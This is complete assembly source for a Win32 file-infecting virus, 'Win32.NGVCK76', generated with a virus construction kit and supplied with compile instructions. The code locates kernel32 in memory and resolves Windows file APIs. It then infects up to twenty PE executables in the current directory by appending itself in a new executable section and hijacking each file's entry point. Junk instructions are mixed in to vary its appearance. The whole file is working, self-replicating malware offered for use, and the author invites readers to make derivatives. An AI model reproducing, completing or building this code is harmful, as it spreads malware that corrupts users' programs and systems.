              
;
;
; Win32.NGVCK76 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK76
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 49
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov edx, dword ptr [esp]
                                        ; add esp, 4
 dec esp
 add esp, 5d
                                        ; mov ebp, edx
 push edx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 push 276d
 pop ecx
 mov esi, ebp
 add esi, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 inc esi
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, ebx

 push ebx
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, eax
 add esi, [eax+3Ch]
                                        ; get File Alignment
 mov ebx, [esi+3Ch]
 mov dword ptr [ebp+filealign], ebx
 mov esi, dword ptr [ebp+MapAddress]
 adc ecx, eax                           ; Trash
                                        ; retrieve PE - Header again
 mov edi, esi
 add edi, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 xor dword ptr [ebp+PEheader], edi
                                        ; get old Entrypoint
 mov eax, dword ptr [edi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], eax
 mov ebx, dword ptr [edi+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov ebx, [edi+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov edx, [edi+74h]
 shl edx, 3
                                        ; clear ecx
 mov ecx, -50188d
 add ecx, 50188d
 mov cx, word ptr [edi+6h]
 mov eax, 28h
 pushad
 mov eax, ecx
 mul eax
 mov dword ptr [ebp+Misc1], eax
 popad
 mov ecx, dword ptr [ebp+Misc1]
 add edi, 78h
 add edi, edx
 add edi, ecx
 lea eax, [ebp+newsection]
 xchg eax, edx


 xchg edx, edi
 push edx
                                        ; Calculate the RVA of the new section
 mov ecx, [edx-5*8+8d]
 add ecx, [edx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], 0
 add dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 push eax
 pop dword ptr [ebp+AlignReg2]
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov eax,[edx-5*8+20d]
 add eax,[edx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], eax
                                        ; calculate new size
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+filealign]
 mov ecx, eax
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
                                        ; mov ecx, -1
 mov ecx, ( -1d - 15d )
 add ecx, 15d
 and ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 lea ecx, [ebp+newsection]
 xchg ebx, ecx

 pop edx
                                        ; mov eax, 64
 mov eax, 0
 add eax, 64d
WriteNewSectionLoop:
 mov ch, byte ptr [ebx]
 mov byte ptr [edx], ch
 add eax, -1
                                        ; add edx, 1
 inc edx
                                        ; add ebx, 1
 inc ebx
 or eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov edx, dword ptr [ebp+PEheader]
 sub word ptr [edx+06h], -1
                                        ; mov ecx, -1
 mov ecx, ( -1d - 11d )
 add ecx, 11d
 and ecx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], ecx
                                        ; set new EIP
 mov dword ptr  [edx+28h], ecx
                                        ; set infection mark
 mov dword ptr [edx+4Ch], 0h
 add dword ptr [edx+4Ch], 'NGVC'
 mov edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 lea ecx, [ebp+Virus]
 xchg ecx, esi

 mov edx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edx, [ebp+WFD_szFileName]
 adc ecx, ecx                           ; Trash
 xchg eax, edx

 push eax
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ebx
 mov ebx, 0
 push ebx
 push edx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop edx
 or eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 counter     dw 0h
 MapHandle   dd 0h
 Trash1      dd 0h
 AlignReg1   dd 0h
 Misc1       dd 0h
 db 'Win32.NGVCK76 - SnakeByte',0
 KernelMZ    dd 0h
 InfCounter  dd 0h
 MapAddress  dd 0h
 OldBase     dd 400000h
 filealign   dd 0h
 OTableVA    dd 0h
 TempApisearch1 dd 0h
 ATableVA    dd 0h

 APINames:
 db 'CreateFileMappingA', 0
 db 'FindClose', 0
 db 'UnmapViewOfFile', 0
 db 'CreateFileA', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'CloseHandle', 0
 db 'MapViewOfFile', 0

 TempAPI     dd 0h
 AlignReg2   dd 0h
 NTableVA    dd 0h
 K32Trys     dd 0h
 KernelPE    dd 0h
 NewSize     dd 0h
 FileHandle  dd 0h
 NTableTemp  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Trash2      dd 0h
 OldEIP      dd 0h
 FindHandle  dd 0h


 APIOffsets:
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h

 NewEIP      dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.DWbRHwj'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 sectionalign   dd 0h
 PEheader    dd 0h
 filemask    db '*.eXe',0




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], esi

 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], edi

 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ecx

                                        ; clear edi
 and edi, 0
 add edi, dword ptr [ebp+OldBase]
 inc ebx                                ; Trash

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], edi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 sub dword ptr [ebp+Trash1], ecx        ; Trash
 push 20d
 pop dword ptr [ebp+InfCounter]
 mov edx, offset filemask
 add edx, ebp

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; round to pages
 ror eax, 16d
 shl eax, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 rol edx, 11d                           ; Trash
 add dword ptr [ebp+K32Trys], 7h

GK1:                                    ; check for DOS-EXE Stub
 mov ebx, dword ptr [ebp+K32Trys]
 cmp ebx, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je CheckPE

GK2:
                                        ; mov ebx, 65536
 mov ebx, ( 65536d xor 1d )
 xor ebx, 1d
 sub eax, ebx
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ebx, [eax+3Ch]
 add ebx, eax
                                        ; check for EP
 movzx ecx, word ptr [ebx]
 sub ecx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ebx, 22
 add ebx, 22d
                                        ; clear edx
 mov edx, 0
 movzx edx, word ptr [ebx]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 dec ebx
 sub ebx, 21d


KernelFound:
 push eax
 pop dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+KernelPE], ebx

 jmp GetApis

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], eax
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [eax]
                                        ; mov eax, edx
 mov eax, edx
                                        ; mov esi, eax
 mov esi, eax
 mov dword ptr [ebp+TempApisearch1], ecx
 push esi
 push ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [ebx]
 cmp dl, byte ptr [esi]
 jne ApiNotFound
 sub ecx, 1
 sub ecx, 1
 inc ecx
 jz FoundApi1
                                        ; add ebx, 1
 inc ebx
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop esi
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+TempApisearch1]
 mov eax, dword ptr [ebp+NTableTemp]
 or edx, edx                            ; Trash
                                        ; add eax, 4
 dec eax
 add eax, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop edx
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [edx]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [eax]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 xor dword ptr [ebp+Trash1], ebx        ; Trash
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ecx, word ptr [ebx]
 cmp ecx, 'ZM'
 je Goodfile
                                        ; clear edx
 push 0
 pop edx
                                        ; add edx, 1
 inc edx
 sub edx, 1
 jz Notagoodfile

Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ebx+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, ebx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ecx, 21850
 mov ecx, ( 21850d + 28d )
 sub ecx, 28d
 cmp ecx, 21850d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 div ecx
                                        ; add eax, 1
 inc eax
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edi
 mov edi, 0
 add edi, [eax+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 add edi, 28d
 or ecx, ebx                            ; Trash
                                        ; get ATableVA
 mov eax, dword ptr [edi]
                                        ; add edi, 4
 inc edi
 add edi, 3d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add edi, 4
 add edi, 4d
                                        ; get OTableVA
 mov eax, dword ptr [edi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax

                                        ; number of API's we're looking for
 mov edx, NumberOfApis

                                        ; load API Names and Offsets
 mov ebx, offset APINames
 add ebx, ebp

 lea ecx, [ebp+APIOffsets]
 xchg ecx, edi


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 mov ecx, ebx
APINameDetect:                          ; calculate the lenght of the names
 inc ecx
 cmp byte ptr [ecx], 0
 jne APINameDetect

 sub ecx, ebx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 1
 inc ebx
 push ebx
 rcl eax, 27d                           ; Trash
 add dword ptr [esp], ecx
 pop ebx
 mov esi, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], 0
 add dword ptr [edi], esi
                                        ; add edi, 4
 dec edi
 add edi, 5d
 sub edx, 1
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 mov edx, 0
 push edx
 call ExitProcess



end FakeCode

